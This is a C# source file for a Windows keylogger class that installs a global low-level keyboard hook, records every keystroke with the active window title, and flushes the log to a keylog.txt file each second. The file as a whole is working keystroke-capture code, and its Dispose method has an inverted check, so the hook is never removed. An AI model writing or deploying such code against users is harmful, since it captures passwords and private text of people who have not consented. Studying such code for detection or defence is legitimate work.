using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using KeyLogger.CallbackMethods;
using KeyLogger.Helpers;
using System.Threading;
using System.IO;

/// <seealso cref="https://github.com/fabriciorissetto/KeystrokeAPI.git"/>
namespace KeyLogger
{
    public class KeyLoggerAPI : IDisposable
    {
        private IntPtr HookId;
        private IntPtr CurrentModuleId;
        const int WH_KEYBOARD_LL = 13;
        const int WM_KEYDOWN = 0x100;
        const int WM_KEYUP = 0x101;
        const int WM_SYSKEYDOWN = 0x104;
        const int WM_SYSKEYUP = 0x105;
        /// <summary>
        /// We need to have this delegate as a private field so the GC doesn't collect it
        /// </summary>
        private Win32.LowLevelKeyboardProc HookProc;
        private Action<KeyPressed> KeyPressedProc;
        static Timer timer;
        static StreamWriter SWriter;

        public KeyLoggerAPI()
        {
            HookId = IntPtr.Zero;
            HookProc = null;
            KeyPressedProc = null;
            string filePath = GetValidFileName(".", "keylog.txt");
            SWriter = new StreamWriter(filePath, true, encoding: System.Text.Encoding.UTF8);
            SWriter.Write("#!/usr/bin/env subl");
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                CurrentModuleId = Win32.GetModuleHandle(curModule.ModuleName);
            }
            timer = new Timer(OnTimeEventHandler, null, 1, 1000); // 1s
        }

        private void OnTimeEventHandler(object state)
        {
            SWriter.Flush();
        }

        string GetValidFileName(string curDirPath, string defaultFileName)
        {
            string filePath = Path.Combine(curDirPath, defaultFileName);
            string ext = Path.GetExtension(defaultFileName);
            string fileNameWithoutExt = Path.GetFileNameWithoutExtension(defaultFileName);
            int suffix = 0;
            while (Directory.Exists(filePath) || File.Exists(filePath))
            {
                filePath = string.Format("{0}\\{1} ({2}){3}", curDirPath, fileNameWithoutExt, ++suffix, ext);
            }
            return filePath;
        }

        public void Start()
        {
            SetHook(PrivateHandle);
        }

        private static string LastWindowTitle = "";
        private static void PrivateHandle(KeyPressed key)
        {
            if (!LastWindowTitle.Equals(key.CurrentWindowTitle))
            {
                SWriter.WriteLine("\r\n" + key.CurrentWindowTitle);
                LastWindowTitle = key.CurrentWindowTitle;
            }
            SWriter.Write(key.ToString());
        }

        public void SetHook(Action<KeyPressed> proc)
        {
            KeyPressedProc = proc ?? throw new ArgumentNullException(nameof(proc));
            HookProc = HookCallback;
            HookId = Win32.SetWindowsHookEx(WH_KEYBOARD_LL, HookProc, CurrentModuleId, 0);
        }

        private IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            int wParamAsInt = wParam.ToInt32();

            if (nCode >= 0 && (wParamAsInt == WM_KEYDOWN || wParamAsInt == WM_SYSKEYDOWN))
            {
                bool shiftKeyDown = false;
                bool capsLockOn = false;

                var shiftKeyState = Win32.GetAsyncKeyState(KeyCode.ShiftKey);
                if (FirstBitIsTurnedOn(shiftKeyState))
                    shiftKeyDown = true;

                //We need to use GetKeyState to verify if CapsLock is "TOGGLED"
                //because GetAsyncKeyState only verifies if it is "PRESSED" at the moment
                if (Win32.GetKeyState(KeyCode.Capital) == 1)
                    capsLockOn = true;

                KeyParser(wParam, lParam, shiftKeyDown, capsLockOn);
            }

            //Chain to the next hook. Otherwise other applications that
            //are listening to this hook will not get notificied
            return Win32.CallNextHookEx(HookId, nCode, wParam, lParam);
        }

        /// <summary>
        ///     Returns true if first bit of keystate from Win32.GetAsyncKeyState
        ///     is on
        /// </summary>
        private bool FirstBitIsTurnedOn(short value)
        {
            //0x8000 == 0b1000 0000 0000 0000
            return Convert.ToBoolean(value & 0x8000);
        }

        /// <summary>
        /// Prepares more info to pass to KeyPressedProc()
        /// </summary>
        private void KeyParser(IntPtr wParam, IntPtr lParam, bool shiftKeyDown, bool capsLockOn)
        {
            //var keyboardLayout = new KeyboardLayout().GetCurrentKeyboardLayout();
            var keyValue = (KeyCode)Marshal.ReadInt32(lParam);
            var activeWindowTitle = new Window().ActiveWindowTitle();
            var key = new KeyPressed(keyValue, shiftKeyDown, capsLockOn, activeWindowTitle);
            KeyPressedProc.Invoke(key);
        }

        /// <summary>
        /// Destructor of this CLASS
        /// </summary>
        public void Dispose()
        {
            if (HookId == IntPtr.Zero)
                Win32.UnhookWindowsHookEx(HookId);
            SWriter.Close();
        }
    }
}
